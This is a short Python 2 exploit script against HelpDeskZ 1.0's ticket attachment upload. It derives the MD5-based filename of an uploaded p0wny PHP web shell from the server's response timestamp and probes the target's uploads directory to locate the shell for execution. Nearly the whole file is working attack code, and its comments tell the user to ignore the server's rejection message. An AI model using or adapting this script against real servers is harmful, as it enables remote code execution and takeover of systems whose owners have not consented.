#!/usr/bin/env python
# convert file by timestamp to exec location --
# $target/uploads/tickets/<hash>.php5

# exploit :141
# https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php#L141

# $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
# $filename = md5($_FILES['attachment']['name'].time()).".".$ext;

# per php's array vals --
# ext = php
# filename = p0wny_shell.txt

"""
Sample upload --
-rw-r--r-- 1 www-data www-data 12045 Jan 25 01:15 15860f750109753af4d5720191d463d1.php5

HTTP/1.1 200 OK
Date: Fri, 25 Jan 2019 01:15:03 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6781
Connection: close
Content-Type: text/html
"""

# full filename: p0wny_shell.txt.php5
# http POST resp date / base url / file / ext 
# you will recieve: "File is not allowed." - disregard that bullshit
d = '25.01.2019 02:06:10'
b = "http://target/support/uploads/tickets/"
f = "p0wny_shell.php5"

# @@@ no "." 
e = "php5"

# Convert Date
import hashlib
import time
import sys
import requests

# @header response - d/m/y/h/m/s
p = '%d.%m.%Y %H:%M:%S'
epoch = int(time.mktime(time.strptime(d, p)))
estr = str(epoch)

for x in range(0, 1):
    m = f + estr 
    md5hash = hashlib.md5(m).hexdigest()
    asmbl = md5hash + "." + e
    print "epoch: " + asmbl 

    url = b+md5hash+'.php5'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "God Dammit ! Nothing here --"



